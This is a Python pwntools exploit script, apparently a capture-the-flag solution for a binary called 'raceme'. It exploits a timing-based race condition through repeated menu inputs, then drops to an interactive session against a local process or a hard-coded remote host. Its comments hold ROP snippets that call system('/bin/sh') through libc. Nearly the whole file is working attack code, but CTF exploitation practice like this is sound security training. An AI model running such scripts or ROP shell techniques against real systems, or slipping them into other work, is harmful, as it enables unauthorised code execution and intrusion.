#!/usr/bin/python2

# some helpful urls
# https://github.com/Naetw/CTF-pwn-tips
# http://ctfhacker.com/ctf/pwnable/2015/08/18/campctf-bitterman.html
# https://github.com/nnamon/linux-exploitation-course

# some certain helpful pwntools commands

# system_off = libc.symbols['system']
# binsh = next(libc.search('/bin/sh\x00'))
# rop2.system(next(libc.search('/bin/sh\x00'))) and print rop2.dump()

# elf = ELF('./binary')
# rop = ROP(elf)
# rop.puts(elf.got['puts'])
# rop.call(elf.symbols['main'])

#http://docs.pwntools.com/en/stable/context.html?highlight=context#pwnlib.context.ContextType.architectures

from pwn import *
import sys
import time

#context(arch='x64', os='linux', 'endian': 'little')

LOCAL = True

HOST = "35.200.147.161"
PORT = 10000
BINARY = "./raceme"
LIB = ""
def exploit(r):
    ctr=20
    while ctr>0:
        r.recvuntil('>> ')
        r.sendline('2')
        r.recvuntil('>- ')
        r.sendline('250')
        ctr-=1
    r.recvuntil('>> ')
    r.sendline('2')
    r.recvuntil('>- ')
    r.sendline('1')
    
    r.recvuntil('>> ')
    r.sendline('1')
    r.recvuntil('>+ ')
    r.sendline('250')

    time.sleep(4)

    r.recvuntil('>> ')
    r.sendline('2')
    r.recvuntil('>- ')
    r.sendline('149')

    ctr=40
    while ctr>0:
        r.recvuntil('>> ')
        r.sendline('2')
        r.recvuntil('>- ')
        r.sendline('249')
        ctr-=1
    r.recvuntil('>> ')
    r.sendline('2')
    r.recvuntil('>- ')
    r.sendline('250')
    r.interactive()
    return

if __name__=="__main__":
    #binary = ELF(BINARY, checksec = False)
    #lib = ELF(LIB, checksec = False)
    #rop = ROP(lib)

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
        exploit(r)
    else:
        LOCAL = True
        r = process(BINARY)#,env={'LD_PRELOAD':LIB}) #remove the ')#'
        print (util.proc.pidof(r))
        pause()
        exploit(r)
